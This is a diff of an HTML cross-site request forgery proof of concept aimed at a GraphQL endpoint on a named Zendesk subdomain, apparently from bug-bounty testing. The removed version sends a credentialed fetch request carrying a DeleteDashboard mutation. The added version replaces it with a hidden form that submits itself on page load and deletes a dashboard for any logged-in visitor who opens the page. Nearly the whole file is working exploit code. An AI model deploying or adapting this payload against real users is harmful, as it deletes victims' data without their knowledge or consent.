@@ -1,46 +1,18 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h3>CSRF PoC - GraphQL DeleteDashboard</h3>
+  <body onload="document.forms[0].submit()">
 
-    <script>
-      fetch("https://bb-tiger2002.zendesk.com/explore/graphql?DeleteDashboard", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          operationName: "DeleteDashboard",
-          variables: {
-            input: {
-              dashboardId: "73563402"
-            }
-          },
-          query: `
-            mutation DeleteDashboard($input: DeleteDashboardInput!) {
-              deleteDashboard(input: $input) {
-                dashboardId
-              }
-            }
-          `
-        })
-      })
-      .then(async (res) => {
-        const text = await res.text();
+    <form action="https://bb-tiger2002.zendesk.com/explore/graphql?DeleteDashboard" method="POST">
 
-        console.log("Status:", res.status);
-        console.log("Response:", text);
+      <input type="hidden" name="operationName" value="DeleteDashboard">
 
-        document.body.innerHTML += `
-          <p>Status: ${res.status}</p>
-          <pre>${text}</pre>
-        `;
-      })
-      .catch(err => {
-        console.log("Request failed:", err);
-        document.body.innerHTML += `<p>Error: ${err}</p>`;
-      });
-    </script>
+      <input type="hidden" name="variables"
+        value='{"input":{"dashboardId":"73562292"}}'>
+
+      <input type="hidden" name="query"
+        value="mutation DeleteDashboard($input: DeleteDashboardInput!) { deleteDashboard(input: $input) { dashboardId } }">
+
+    </form>
+
   </body>
 </html>
